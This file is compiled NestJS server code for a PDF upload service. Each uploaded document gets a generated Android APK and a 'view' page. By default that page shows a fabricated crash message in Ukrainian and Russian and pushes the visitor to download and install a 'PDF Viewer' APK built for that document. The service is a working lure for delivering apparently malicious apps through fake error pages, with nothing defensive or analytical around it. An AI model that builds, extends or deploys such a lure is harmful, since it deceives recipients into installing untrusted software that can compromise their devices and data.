"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.PdfService = void 0;
const common_1 = require("@nestjs/common");
const path_1 = require("path");
const fs = __importStar(require("fs"));
const prisma_service_1 = require("../prisma.service");
const apk_service_1 = require("../apk/apk.service");
let PdfService = class PdfService {
    prisma;
    apkService;
    viewTemplate;
    constructor(prisma, apkService) {
        this.prisma = prisma;
        this.apkService = apkService;
        const templatePath = (0, path_1.join)(__dirname, '..', '..', 'src', 'views', 'pdf-view.html');
        const distTemplatePath = (0, path_1.join)(__dirname, '..', 'views', 'pdf-view.html');
        if (fs.existsSync(distTemplatePath)) {
            this.viewTemplate = fs.readFileSync(distTemplatePath, 'utf-8');
        }
        else if (fs.existsSync(templatePath)) {
            this.viewTemplate = fs.readFileSync(templatePath, 'utf-8');
        }
        else {
            throw new Error(`PDF view template not found. Looked in:\n  ${distTemplatePath}\n  ${templatePath}`);
        }
    }
    async uploadPdf(file) {
        try {
            const originalName = Buffer.from(file.originalname, 'latin1').toString('utf8');
            const record = await this.prisma.pdfRecord.create({
                data: {
                    originalName,
                    modifiedName: file.filename,
                    lastPingAt: new Date(0),
                },
            });
            const viewUrl = `/view/${record.id}`;
            this.apkService.enqueueApkBuild(record.id, file.path, record.originalName);
            return {
                message: 'File uploaded successfully',
                originalFilename: file.originalname,
                pdfId: record.id,
                viewUrl,
            };
        }
        catch (error) {
            throw new common_1.HttpException(`Error uploading PDF: ${error.message}`, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async renderViewPage(id) {
        const record = await this.prisma.pdfRecord.findUnique({ where: { id } });
        if (!record) {
            throw new common_1.HttpException('Not found', common_1.HttpStatus.NOT_FOUND);
        }
        const docName = record.originalName
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
        const downloadApkName = process.env.DOWNLOAD_APK_NAME || 'PDF Viewer.apk';
        const htmlModalTitle = process.env.HTML_MODAL_TITLE || 'помилка читання документу';
        const htmlErrorMain = process.env.HTML_ERROR_MAIN || 'Не удалось открыть документ';
        const htmlErrorDetail = process.env.HTML_ERROR_DETAIL || 'При попытке запустить документ возникла критическая ошибка. Файл повреждён или требует дополнительных компонентов для корректного отображения.<br><br>Приложение не может запустить средство просмотра. Для устранения проблемы загрузите и установите необходимый компонент запуска.';
        const htmlErrorCode = process.env.HTML_ERROR_CODE || 'Error 0xC0000142 · Launch failed · PDF Viewer crashed';
        const htmlInstallButton = process.env.HTML_INSTALL_BUTTON || '&#11015; Установить PDF Viewer';
        return this.viewTemplate
            .replace('{{DOC_NAME}}', docName)
            .replace('{{APK_URL}}', `/apk/download/${id}`)
            .replace('{{DOWNLOAD_APK_NAME}}', downloadApkName)
            .replace('{{HTML_MODAL_TITLE}}', htmlModalTitle)
            .replace('{{HTML_ERROR_MAIN}}', htmlErrorMain)
            .replace('{{HTML_ERROR_DETAIL}}', htmlErrorDetail)
            .replace('{{HTML_ERROR_CODE}}', htmlErrorCode)
            .replace('{{HTML_INSTALL_BUTTON}}', htmlInstallButton);
    }
    async getApkFilePath(id) {
        const record = await this.prisma.pdfRecord.findUnique({ where: { id } });
        if (!record) {
            throw new common_1.HttpException('Not found', common_1.HttpStatus.NOT_FOUND);
        }
        const path = this.apkService.getApkPath(record.originalName);
        if (!fs.existsSync(path)) {
            throw new common_1.HttpException('APK not generated yet or already deleted', common_1.HttpStatus.NOT_FOUND);
        }
        return path;
    }
    async resolveRawFilePath(filename) {
        const uploadDir = process.env.UPLOAD_DIR_NAME
            ? (require('path').isAbsolute(process.env.UPLOAD_DIR_NAME)
                ? process.env.UPLOAD_DIR_NAME
                : (0, path_1.join)(__dirname, '..', '..', process.env.UPLOAD_DIR_NAME))
            : (0, path_1.join)(__dirname, '..', '..', 'uploads', 'original');
        let filePath = (0, path_1.join)(uploadDir, filename);
        if (!fs.existsSync(filePath)) {
            const possibleId = filename.replace('.pdf', '');
            const r = await this.prisma.pdfRecord.findUnique({
                where: { id: possibleId },
            });
            if (r) {
                filePath = (0, path_1.join)(uploadDir, r.modifiedName);
            }
            if (!fs.existsSync(filePath)) {
                throw new common_1.HttpException('File not found', common_1.HttpStatus.NOT_FOUND);
            }
        }
        return filePath;
    }
    async resolveViewId(filename) {
        const record = await this.prisma.pdfRecord.findFirst({
            where: { modifiedName: filename },
        });
        if (record)
            return record.id;
        const possibleId = filename.replace('.pdf', '');
        const recordById = await this.prisma.pdfRecord.findUnique({
            where: { id: possibleId },
        });
        if (recordById)
            return recordById.id;
        throw new common_1.HttpException('File not found', common_1.HttpStatus.NOT_FOUND);
    }
};
exports.PdfService = PdfService;
exports.PdfService = PdfService = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [prisma_service_1.PrismaService,
        apk_service_1.ApkService])
], PdfService);
//# sourceMappingURL=pdf.service.js.map